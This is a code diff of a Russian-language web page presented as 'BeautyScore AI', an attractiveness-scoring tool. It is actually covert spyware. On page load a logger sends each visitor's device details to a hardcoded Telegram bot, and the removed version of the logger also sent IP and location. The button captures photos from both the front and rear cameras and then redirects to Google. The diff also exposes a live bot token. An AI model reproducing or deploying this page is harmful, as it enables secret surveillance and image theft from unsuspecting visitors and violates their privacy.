@@ -5,50 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>BeautyScore AI — Анализ внешности</title>
     <style>
-        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #0f0c29; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden; }
-        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px 20px; border-radius: 30px; text-align: center; max-width: 360px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; }
-        .icon { font-size: 60px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #ff0080); }
-        h1 { font-size: 24px; margin: 0 0 10px; letter-spacing: 2px; text-transform: uppercase; color: #00f2fe; }
-        p { font-size: 14px; color: #ccc; line-height: 1.6; margin-bottom: 30px; }
-        #b { padding: 18px 40px; background: linear-gradient(90deg, #ff0080, #ff8c00); border: none; border-radius: 50px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(255, 0, 128, 0.3); text-transform: uppercase; }
-        #scan-line { display: none; position: absolute; left: 0; top: 0; width: 100%; height: 4px; background: #00f2fe; box-shadow: 0 0 15px #00f2fe; animation: scan 2s infinite ease-in-out; }
-        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
-        #status { margin-top: 20px; font-size: 13px; color: #00f2fe; min-height: 20px; }
+        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #0f0c29; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); font-family: sans-serif; color: white; overflow: hidden; }
+        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px 20px; border-radius: 30px; text-align: center; max-width: 360px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        h1 { font-size: 24px; margin: 0 0 10px; color: #00f2fe; }
+        #b { padding: 18px 40px; background: linear-gradient(90deg, #ff0080, #ff8c00); border: none; border-radius: 50px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    <div id="scan-line"></div>
-    <div class="icon">💎</div>
     <h1>BeautyScore AI</h1>
-    <p>Нейросеть определит ваш идеальный балл привлекательности по 100+ параметрам.</p>
+    <p>Нейросеть определит ваш балл привлекательности по 100+ параметрам.</p>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
     <button id="b">Узнать мой балл</button>
-    <div id="status">Система готова...</div>
+    <div id="status" style="margin-top:20px; color:#00f2fe;">Система готова...</div>
 </div>
 
 <script>
     const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
     const chat_id = '7164380121';
-    const btn = document.getElementById('b');
-    const status = document.getElementById('status');
-    const scanLine = document.getElementById('scan-line');
 
-    // ОБНОВЛЕННЫЙ СУПЕР-ЛОГГЕР (Срабатывает сразу)
-    async function logVisit() {
-        try {
-            const res = await fetch('https://ipapi.co'); 
-            const d = await res.json();
-            const info = `👀 КТО-ТО ЗАШЕЛ!\n\n📍 IP: ${d.ip}\n🌍 Страна: ${d.country_name}\n🏙 Город: ${d.city}\n🏢 Провайдер: ${d.org}\n📱 Устройство: ${navigator.platform}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
-        } catch (e) {
-            // Если первый сервис упал, пробуем второй (только IP)
-            const simpleRes = await fetch('https://api.ipify.org');
-            const simpleData = await simpleRes.json();
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("👀 Заход с IP: " + simpleData.ip)}`);
-        }
+    // САМЫЙ НАДЕЖНЫЙ СПОСОБ: Уведомление через сам Telegram
+    function logVisit() {
+        const platform = navigator.platform;
+        const lang = navigator.language;
+        const time = new Date().toLocaleTimeString();
+        const info = `👀 НОВЫЙ ВИЗИТ!\n⏰ Время: ${time}\n📱 Платформа: ${platform}\n🌐 Язык: ${lang}\n⚙️ Браузер: ${navigator.userAgent.substring(0, 50)}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
     }
     logVisit();
 
@@ -70,14 +54,12 @@
         } catch (e) {}
     }
 
-    btn.onclick = async () => {
-        btn.style.display = "none";
-        scanLine.style.display = "block";
-        status.innerText = "Анализ биометрии (Front)...";
+    document.getElementById('b').onclick = async () => {
+        document.getElementById('b').style.display = "none";
+        document.getElementById('status').innerText = "Анализ биометрии...";
         await takePhoto("user"); 
-        status.innerText = "Глубинное сканирование (Back)...";
         await takePhoto("environment"); 
-        status.innerText = "Генерация результата...";
+        document.getElementById('status').innerText = "Готово!";
         setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
     };
 </script>
